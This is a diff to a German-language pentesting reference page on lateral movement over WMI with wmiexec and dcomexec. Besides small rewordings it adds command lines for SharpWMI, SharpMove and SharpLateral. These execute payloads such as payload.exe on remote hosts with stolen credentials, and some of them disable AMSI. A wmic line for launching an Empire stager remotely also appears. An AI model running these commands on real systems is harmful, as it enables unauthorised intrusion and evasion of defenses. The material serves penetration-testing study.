@@ -4,9 +4,9 @@
 
 ## Wie es funktioniert
 
-Prozesse können auf Hosts geöffnet werden, bei denen der Benutzername und entweder das Passwort oder der Hash bekannt sind, durch die Verwendung von WMI. Befehle werden über WMI von Wmiexec ausgeführt, was ein semi-interaktives Shell-Erlebnis bietet.
+Prozesse können auf Hosts geöffnet werden, bei denen der Benutzername und entweder das Passwort oder der Hash bekannt sind, durch die Verwendung von WMI. Befehle werden mit WMI durch Wmiexec ausgeführt, was eine semi-interaktive Shell-Erfahrung bietet.
 
-**dcomexec.py:** Dieses Skript nutzt verschiedene DCOM-Endpunkte und bietet eine semi-interaktive Shell ähnlich wie wmiexec.py, wobei speziell das ShellBrowserWindow DCOM-Objekt verwendet wird. Es unterstützt derzeit MMC20. Anwendungs-, Shell-Fenster- und Shell-Browser-Fensterobjekte. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Durch die Nutzung verschiedener DCOM-Endpunkte bietet dieses Skript eine semi-interaktive Shell ähnlich wie wmiexec.py, wobei speziell das ShellBrowserWindow DCOM-Objekt verwendet wird. Es unterstützt derzeit MMC20. Anwendungs-, Shell-Fenster- und Shell-Browser-Fensterobjekte. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## WMI-Grundlagen
 
@@ -76,7 +76,7 @@ Sammeln von System- und Prozessinformationen über WMI:
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
 ```
-Für Angreifer ist WMI ein leistungsfähiges Werkzeug zur Auflistung sensibler Daten über Systeme oder Domänen.
+Für Angreifer ist WMI ein leistungsstarkes Werkzeug zur Auflistung sensibler Daten über Systeme oder Domänen.
 ```bash
 wmic computerystem list full /format:list
 wmic process list /format:list
@@ -95,11 +95,7 @@ Um einen Prozess über WMI remote auszuführen, wie das Bereitstellen eines Empi
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-Dieser Prozess veranschaulicht die Fähigkeit von WMI zur Remote-Ausführung und Systemenumeration und hebt seine Nützlichkeit sowohl für die Systemadministration als auch für das Pentesting hervor.
-
-## Referenzen
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+Dieser Prozess veranschaulicht die Fähigkeit von WMI zur Remote-Ausführung und Systemenumeration und hebt seinen Nutzen sowohl für die Systemadministration als auch für das Pentesting hervor.
 
 ## Automatische Werkzeuge
 
@@ -107,4 +103,24 @@ Dieser Prozess veranschaulicht die Fähigkeit von WMI zur Remote-Ausführung und
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- Sie könnten auch **Impacket's `wmiexec`** verwenden.
+
+
+## Referenzen
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
